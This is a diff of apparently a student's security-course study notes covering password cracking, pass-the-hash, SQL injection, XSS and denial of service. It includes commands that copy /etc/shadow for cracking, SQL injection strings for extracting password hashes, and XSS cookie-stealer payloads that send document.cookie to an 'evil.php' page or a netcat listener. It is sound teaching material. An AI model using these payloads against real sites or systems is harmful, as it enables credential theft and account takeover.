@@ -60,9 +60,11 @@ Gaining Access
 Web App Attacks
 Denial of Service
 
+## Exploitation - Gaining Access
+
 ### IP Address Spoofing
 
-### Passsive and Active Sniffing
+### Passive and Active Sniffing
 
 ### Session Hijacking with Ettercap
 
@@ -78,49 +80,65 @@ Allows an attacker to execute arbitrary commands on your machine.
 
 Related to manipulating programs that misuse printf and related commands to read arbitrary information from memory.
 
+### Password Cracking
 
+#### Password Cracking Methodologies
 
+1. Dictionary attack
+2. Brute force attack
+3. Hybrid
 
+John the Ripper (on Linux):
 
+```
+cp /etc/passwd /tmp/passwd_copy
+cp /etc/shadow /tmp/shadow_copy
 
+unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined
 
+/run/john /tmp/combined
+```
 
+John the Ripper (on Windows)
 
+john-mmx.exe c:\path\to\sam.txt
 
+### Pass-the-Hash Attacks
 
+Instead of, or in addition to, stealing password hashes and cracking them, you can also use the pilfered hashes to directly attempt authentication from one box to another.
 
+### Worms & Bots
 
+Worms are designed to be self-propagating and are intended to quickly spread and infect other systems very quickly.
+Worms come in different flavors:  multi-exploit, multi-platform, zero-day, flash technique induced, and polymorphic.
 
+### Virtual Machine Attacks
 
+## Exploitation - Web App Attacks
 
+### Account Harvesting
 
+The ability to discern valid userIDs based on how the application responds when the user tried to authenticate. After discerning the error messages, behaviors, and output, automation can be leveraged to quickly identify a list of valid userIDs.
 
+### Command Injection
 
-Source: 401.2, pg. 214
-
-- Malicious Code
-- Remote Maintenance
-- Denial of Service
-- Brute Force
-- Browsing
-- Race Conditions
-- Alteration of Code
-- Rootkits
-
-### Smurf Attack (Using Broadcast Address)
-
-Source: 401.1, pg. 77
-
-Sends spoofed ICMP echo requests (also known as "ping") to a network's broadcast address. The spoofed machine gets many, many responses, consuming most or all of its bandwidth.
+The manipulation of web application behavior that takes user input and executes it in the back end; bad guys can manipulate this to achieve code execution in certain instances.
 
 ### SQL Injection
 
-SQL Injection is the most common webbased attack. It is use when the hacker places commands which can trigger valid SQL queries within a field not typically associated with SQL commands. Fields like "Username" and "Password". But these types of command be inserted into any DB style entry field.
+SQL Injection is the most common web-based attack. It is used when the hacker places commands which can trigger valid SQL queries within a field not typically associated with SQL commands. Fields like "Username" and "Password". But these types of commands cab be inserted into any DB style entry field.
 
 1. List Field Values #1:
 An attacker may try the following to see if they can get a list of values from a particular field, user, pass, version, email, etc.
+
 ```
 '0 OR 1=1'
+```
+
+Or:
+
+```
+' or '1'='1
 ```
 
 Equivalent to the SQL Command:
@@ -144,24 +162,31 @@ Equivalent to the SQL Command:
 SELECT user_id, username, password_hash FROM users WHERE username = 'john'; 
 INSERT INTO group_membership (user_id, group) VALUES (SELECT user_id FROM users WHERE username='john', 'Administrator'); --'
 
+4. Getting Hashesh
+
+```
+admin' union select password from users where username='admin';--
+```
+
 ### XSS Attacks
 
 1. Black Box Testing
-
-Enter the following in the url:
+Enter the following in the URL:
 
 ```
 hxxp://www.site.com/index.php?name=<script>alert(123)</script>
 ```
 
 2. Search Test
-If the site has a serach field without proper sanitization:
+If the site has a search field without proper sanitization:
+
 ```
 hxxp://www.site.com/search?source=“><script>alert(123)</script>
 ```
 
 3. One Error Test
 If the site has a mouseover or onerror capability
+
 ```
 hxxp://www.site.com/index.php?name=<b onmouseover=alert('Wufff!')>click me!</b>
 ```
@@ -169,12 +194,63 @@ hxxp://www.site.com/index.php?name=<b onmouseover=alert('Wufff!')>click me!</b>
 hxxp://www.site.com/index.php?name=<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
 ```
 
+5. Assessing about:cache Entries (Firefox)
+
+```
+Type "about:cache" in the address bar
+Click on 'List Cache Entries'
+Analyze recent capture entries of attempted XSS entry points
+```
+
 4. Cookie Stealer
+
 ```
 hxxp://www.site.com/index.php?name=<SCRIPT type="text/javascript"> var adr = '../evil.php?cakemonster=' + escape(document.cookie);</SCRIPT>
 ```
 
-5. Hide from javascript
+Another example using netcat (nc):
+
+Start a nc listener:
+
+```
+nc -l -v -p 2222
+```
+
+Enter the following in the <script> tag:
+
+```
+<script>document.location='http://127.0.0.1:2222/grab.cgi?'+document.cookie;</script>
+```
+
+The cookie will be relayed to the netcat (nc) listener.
+
+Using the stolen cookie to gain additional access with Nikto:
+
+```
+perl ./nikto.pl -Single
+[Hostname or IP]: 127.0.0.1
+[URL(/)]: /admind.php
+[Data]: Cookie: user=1337
+```
+
+5. Hide from JavaScript
 ```
 hxxp://www.site.com/index.php?name=<IMG SRC=j&#X41vascript:alert(123)>
 ```
+
+### Attacking State Maintenance with Web App Manipulation Proxies
+
+Great tools: ZAP, Burp, w3af, and Fiddler.
+
+## Exploitation - Denial of Service
+
+### Local DOS
+
+### DNS Amplification Attacks
+
+### DoS Suites
+
+### Distributed DoS (DDoS)
+
+
+
